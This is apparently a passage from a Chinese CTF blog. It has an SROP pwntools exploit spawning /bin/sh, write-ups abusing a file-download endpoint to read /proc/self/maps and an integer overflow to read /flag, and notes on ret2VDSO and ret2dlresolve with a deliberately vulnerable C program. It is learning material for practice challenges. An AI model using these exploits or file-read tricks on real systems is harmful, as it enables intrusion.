class="line"></span><br></pre></td></tr></table></figure>

<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x401129</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">read_addr  = <span class="number">0x401106</span></span><br><span class="line">syscall    = <span class="number">0x401120</span></span><br><span class="line">frame_addr = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">read_addr  = <span class="number">0x401106</span></span><br><span class="line">syscall    = <span class="number">0x401120</span></span><br><span class="line">pivot_addr = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span></span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">frame0 = SigreturnFrame()</span><br><span class="line">frame0.rax = <span class="number">0</span> <span class="comment"># read syscall</span></span><br><span class="line">frame0.rdi = <span class="number">0</span> <span class="comment"># fd = 0</span></span><br><span class="line">frame0.rsi = pivot_addr <span class="comment"># writable section available</span></span><br><span class="line">frame0.rsp = pivot_addr</span><br><span class="line">frame0.rdx = <span class="number">0x500</span> <span class="comment"># count</span></span><br><span class="line">frame0.rip = syscall <span class="comment"># syscall addr</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame0)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>) <span class="comment"># rax = 15 (sigreturn)</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + cyclic(<span class="number">0x200</span>-<span class="built_in">len</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)) <span class="comment"># padding</span></span><br><span class="line">payload += p64(read_addr) </span><br><span class="line">payload += p64(syscall) </span><br><span class="line"></span><br><span class="line">frame1=SigreturnFrame()</span><br><span class="line">frame1.rax = <span class="number">59</span> <span class="comment"># execve syscall</span></span><br><span class="line">frame1.rsi = <span class="number">0</span> <span class="comment"># argv</span></span><br><span class="line">frame1.rdx = <span class="number">0</span> <span class="comment"># envp</span></span><br><span class="line">frame1.rdi = pivot_addr <span class="comment"># contains string /bin/sh</span></span><br><span class="line">frame1.rip = syscall</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame1)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/02/01/2026-02-01-ezphp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/02/01/2026-02-01-ezphp/" class="post-title-link" itemprop="url">CTF题解：ezphp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2026-02-01 10:56:00" itemprop="dateCreated datePublished" datetime="2026-02-01T10:56:00+08:00">2026-02-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-02-02 21:48:53" itemprop="dateModified" datetime="2026-02-02T21:48:53+08:00">2026-02-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>打开题目界面，需要输入用户名和密码，我们F12查看，可以发现用户名和密码是硬编码的，直接输入即可登录</p>
<p><img src="/images/VNCTF2026/02-01-ezphp/passwd.png" alt="image-20260202140316527"></p>
<p>登录后，发现需要想办法获取到拓展文件的路径然后下载它，尝试在文件下载接口输入 <code>/proc/self/maps</code>（<em>输出当前进程的内存映射信息，在ret2vdso调试部分详细解释</em>），就可以下载一个文件，打开后即可找到vuln.so路径</p>
<p><img src="/images/VNCTF2026/02-01-ezphp/pass.png" alt="image-20260202141950226"></p>
<p>接下来直接访问<a target="_blank" rel="noopener" href="http://114.66.24.228:33951/download.php?path=/usr/local/lib/php/extensions/no-debug-non-zts-20240924/vuln.so%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD">http://114.66.24.228:33951/download.php?path=/usr/local/lib/php/extensions/no-debug-non-zts-20240924/vuln.so就可以下载</a> vuln.so</p>
<p>查了一下这个.so文件好像是什么php扩展，反编译好多代码，有关堆的使用，不理解在干什么。没看懂，先放着了。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/01/31/2026-01-31-eat%20some%20AI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/01/31/2026-01-31-eat%20some%20AI/" class="post-title-link" itemprop="url">CTF题解：eat some AI</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2026-01-31 20:56:00" itemprop="dateCreated datePublished" datetime="2026-01-31T20:56:00+08:00">2026-01-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-02-09 17:14:04" itemprop="dateModified" datetime="2026-02-09T17:14:04+08:00">2026-02-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="eat-some-AI"><a href="#eat-some-AI" class="headerlink" title="eat some AI"></a>eat some AI</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>根据提示，我们要进行Fuzzing，还要分析 <code>game</code> 二进制文件，找到获取 shell 或读取 flag 的利用路径。</p>
<p>nc到游戏界面，可以发现有两类输入，一种是输入“战斗”，另一种是输入数字购买道具；胜利获得积分，失败和逃跑无积分。</p>
<p>尝试提示“是否开始战斗？”时输入大量数字，发现这样会触发“你选择了逃跑…”，导致退出，所以猜测在提示“你要购买几个？”的地方存在溢出。</p>
<p>尝试输入多个数字，发现在输入 9 个 1 时，积分会变得超级大，猜测这里有整数溢出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">售价: 3000 积分/个 (效果可叠加)</span><br><span class="line">你要购买几个？(输入 0 离开): 111111111</span><br><span class="line">[系统] 总计需要支付: -1674116088 积分</span><br><span class="line">[流浪商人] 很好... 拿去吧...</span><br><span class="line">获得护符！胜率大幅提升！</span><br><span class="line">当前剩余积分: 1674119288</span><br><span class="line">预期获得积分: 2500</span><br><span class="line">是否开始战斗？(输入 &#x27;战斗&#x27; 继续，或其他任意键退出)</span><br></pre></td></tr></table></figure>



<p>继续输入“战斗”，在胜利后会出现下面输出，再输入ls后可以得到一些文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">是否开始战斗？(输入 &#x27;战斗&#x27; 继续，或其他任意键退出)</span><br><span class="line">战斗</span><br><span class="line">战斗开始...</span><br><span class="line">&gt;&gt;&gt; 胜利！击败了 历战王 反叛的史柴格斯 &lt;&lt;&lt;</span><br><span class="line">获得 2500 基础积分！</span><br><span class="line">达成 2 连胜！额外获得 200 积分！</span><br><span class="line">存档已保存。</span><br><span class="line">恭喜你，渡夜者！你已达完全掌握黑夜卢恩的力量。</span><br><span class="line">ls</span><br><span class="line">save.json</span><br></pre></td></tr></table></figure>



<h2 id="二、AI策略"><a href="#二、AI策略" class="headerlink" title="二、AI策略"></a>二、AI策略</h2><p>来让 AI 得到真实的文件，可以看到输出了几个文件，其中<code>game</code>就是我们需要分析的二进制文件</p>
<p><img src="/images/VNCTF2026/1-31-eat-some-AI/ls.png" alt="image-20260131202526072"></p>
<p>当前目录下没有flag文件，那我们就在当前目录和根目录查找flag</p>
<p>![image-20260131230709503](&#x2F;images&#x2F;VNCTF 2026&#x2F;1-31-eat-some-AI&#x2F;flag.png)</p>
<p>查到了flag路径，cat &#x2F;flag即可</p>
<p><img src="/images/VNCTF2026/1-31-eat-some-AI/flag2.png" alt="image-20260131231238415"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">学习笔记：ret2VDSO技术</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2026-01-30 10:00:00" itemprop="dateCreated datePublished" datetime="2026-01-30T10:00:00+08:00">2026-01-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-02-03 21:47:10" itemprop="dateModified" datetime="2026-02-03T21:47:10+08:00">2026-02-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ret2VDSO-技术"><a href="#ret2VDSO-技术" class="headerlink" title="ret2VDSO 技术"></a>ret2VDSO 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><p>好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧</p>
<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-简介"><a href="#i-简介" class="headerlink" title="i 简介"></a>i 简介</h3><ol>
<li><em>VDSO (Virtual Dynamically-linked Shared Object)</em>：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 <code>linux-vdso.so.1</code> 或 <code>linux-gate.so.1</code>。</li>
<li>为了提供一些常用系统调用的用户态快速实现（如 <code>gettimeofday</code>、<code>clock_gettime</code>），避免频繁的用户态&#x2F;内核态切换。</li>
<li>虽然表现为一个 <code>.so</code> 文件，但它并不存在于磁盘上，而是由内核在进程启动时映射到内存。</li>
</ol>
<h3 id="ii-补充"><a href="#ii-补充" class="headerlink" title="ii 补充"></a>ii 补充</h3><ol>
<li>VDSO属于操作系统，它由内核生成，是内核在运行时动态构造并映射到进程地址空间。</li>
<li>几乎每个用户态进程都会有一块 VDSO 区域，地址可能不同（受 ASLR 影响），但内容由内核统一提供。</li>
<li>你的程序不需要显式链接 VDSO，内核会自动把它映射进去。即使你写一个最简单的 <code>int main(){return 0;}</code>，运行时也会有 VDSO。<em>就是说程序只是使用内核提供的VDSO共享区域，而不是像 ret2dlresolve 的符号表那样由程序生成</em></li>
<li>与其说VDSO是一个共享库，不如说VDSO是内核映射出的一个共享区域(共享内存)，里面包含了一小段真正的可执行代码（ELF 格式的共享对象），提供一些常用系统调用的用户态实现。</li>
</ol>
<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>首先简单说一下命令（最底层的接口，gdb 的 vmmap也可以找到）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps → 输出当前进程的内存映射信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/self/auxv → 输出当前进程的 ELF 辅助向量信息。</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><code>/proc</code></h4><ul>
<li>这是 Linux 的 <em>进程信息伪文件系统</em>（procfs）。</li>
<li>作用：它不是存放在磁盘上的真实文件，而是内核提供的一种接口，用来查看和操作进程、内核状态。</li>
<li>特点：里面的文件和目录都是动态生成的，反映的是系统当前的运行状态。</li>
</ul>
<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a><code>/proc/self</code></h4><ul>
<li><code>self</code> 是一个特殊的符号链接，始终指向 <em>当前进程的目录</em>。</li>
<li>作用：在 <code>/proc</code> 下，每个进程都有一个以 PID 命名的目录，比如 <code>/proc/1234</code>。<ul>
<li>如果你在进程 A 中访问 <code>/proc/self</code>，它就等价于 <code>/proc/&lt;A的PID&gt;</code>。</li>
</ul>
</li>
</ul>
<h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a><code>/proc/self/maps</code></h4><ul>
<li><code>maps</code> 指当前进程的 <em>内存映射表</em>。</li>
<li>作用：列出进程地址空间中所有的内存区域，包括：<ul>
<li>程序代码段、数据段</li>
<li>堆 (<code>[heap]</code>)</li>
<li>栈 (<code>[stack]</code>)</li>
<li>动态库（如 libc）</li>
<li>特殊区域（如 <code>[vdso]</code>）</li>
</ul>
</li>
</ul>
<h4 id="proc-self-auxv"><a href="#proc-self-auxv" class="headerlink" title="/proc/self/auxv"></a><code>/proc/self/auxv</code></h4><ul>
<li><code>auxv</code>当前进程的 <strong>ELF 辅助向量</strong>。</li>
<li>作用：这是内核在进程启动时传递给用户态的一组参数，包含运行环境信息，比如：<ul>
<li><code>AT_SYSINFO_EHDR</code> → VDSO 的基址</li>
<li><code>AT_EXECFN</code> → 可执行文件路径</li>
<li><code>AT_PLATFORM</code> → CPU 架构</li>
<li><code>AT_PAGESZ</code> → 页大小</li>
</ul>
</li>
<li>用途：程序或调试器可以通过它直接获取 VDSO 基址、随机数种子等信息。</li>
</ul>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/01/29/2026-01-29-ret2dlsolve%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/01/29/2026-01-29-ret2dlsolve%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">学习笔记：ret2dlsolve技术</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2026-01-29 10:56:00" itemprop="dateCreated datePublished" datetime="2026-01-29T10:56:00+08:00">2026-01-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-02-02 14:37:31" itemprop="dateModified" datetime="2026-02-02T14:37:31+08:00">2026-02-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ret2dlsolve-技术"><a href="#ret2dlsolve-技术" class="headerlink" title="ret2dlsolve 技术"></a>ret2dlsolve 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显式写一个内联汇编函数，保证有一个pop rdi ; ret</span></span><br><span class="line">__attribute__((naked)) <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rdi\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rsi\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret\n\t&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险函数，存在栈溢出漏洞</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your message: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有限制输入长度，导致栈溢出</span></span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You entered: %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to ret2dlresolve demo!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID: %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    vulnerable_function();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line"> gcc -fno-stack-protector -no-pie -z lazy -O0 -g dlsolve.c -o ret2dlsolve</span><br></pre></td></tr></table></figure>



<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-思路"><a href="#i-思路" class="headerlink" title="i 思路"></a>i 思路</h3><ol>
<li>直接修改现有符号表项，将 read或其他函数名设置为 system，让程序自己解析出system，这种比较简单，但只适用于No RELRO，下面的方法可以适用于Partial RELRO</li>
<li>全部伪造符号表重定位表，写入 system字符串，手动让程序解析 system，这种方法比较麻烦，需要计算偏移和索引，但是更稳定一些，下面我们使用第二种方法。</li>
</ol>
<blockquote>
<p><strong>No RELRO</strong>：GOT 表完全可写，.dynamic 段可写，延迟绑定（函数第一次调用时才解析）</p>
<p><strong>Partial RELRO</strong>：.got 只读（非 PLT 相关的 GOT），.got.plt 可写（PLT 相关的 GOT），.dynamic 可写，延迟绑定（函数第一次调用时才解析）</p>
<p><strong>Full RELRO</strong>：所有 GOT 表只读，.dynamic 段只读，启动时全部解析（程序启动时解析所有符号）</p>
</blockquote>
<h3 id="ii-方法"><a href="#ii-方法" class="headerlink" title="ii 方法"></a>ii 方法</h3><ol>
<li><p>我们要调用的函数（比如 <code>system</code>）并不在程序里直接出现。正常情况下，程序不会解析它。 ret2dlresolve 的技巧就是：<strong>伪造一次 “动态解析请求”，让链接器帮我们解析出 <code>system</code> 的地址。</strong></p>
</li>
<li><p>具体做法：</p>
<ul>
<li>在 <code>.bss</code> 段伪造一个 <strong>符号表条目 (Elf64_Sym)</strong>，名字指向 <code>&quot;system&quot;</code>。</li>
<li>在 <code>.bss</code> 段伪造一个 <strong>重定位表条目 (Elf64_Rela)</strong>，指向某个 GOT 表项，并关联到我们伪造的符号。</li>
<li>构造 ROP 链**调用 <code>plt[0]</code> **，并传入 relocation 索引。</li>
<li>链接器看到这个索引，就会去<strong>解析 <code>&quot;system&quot;</code></strong>，找到 libc 里的 <code>system</code> 函数地址，并执行它。</li>
</ul>
</li>
<li><h4 id="ELF-动态解析流程（正常情况）"><a href="#ELF-动态解析流程（正常情况）" class="headerlink" title="ELF 动态解析流程（正常情况）"></a>ELF 动态解析流程（正常情况）</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">用户调用 read@plt</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">.plt 桩代码 → 跳到动态链接器</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">.rela.plt → 查找对应的重定位条目 (Elf64_Rela)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">.dynsym → 根据符号索引找到符号表条目 (Elf64_Sym)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">.dynstr → 根据 st_name 偏移找到函数名字符串 (&quot;read&quot;)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">链接器解析 libc 中的真实地址 → 写入 .got.plt</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">下次调用直接跳到 libc 的 read()</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="ret2dlresolve-利用流程（伪造情况）"><a href="#ret2dlresolve-利用流程（伪造情况）" class="headerlink" title="ret2dlresolve 利用流程（伪造情况）"></a>ret2dlresolve 利用流程（伪造情况）</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────┐</span><br><span class="line">│ .bss 段       │ ← 我们可写的区域</span><br><span class="line">│  &quot;system\x00&quot; │ ← 符号名</span><br><span class="line">│  &quot;/bin/sh\x00&quot;│ ← 参数字符串</span><br><span class="line">│  Elf64_Sym    │ ← 伪造符号表条目</span><br><span class="line">│  Elf64_Rela   │ ← 伪造重定位条目</span><br><span class="line">└───────┬───────┘</span><br><span class="line">        │ relocation 索引指向这里</span><br><span class="line">┌───────▼───────┐</span><br><span class="line">│ plt[0]        │ ← 我们的第二次 ROP 跳到这里</span><br><span class="line">│ 动态解析 &quot;system&quot;</span><br><span 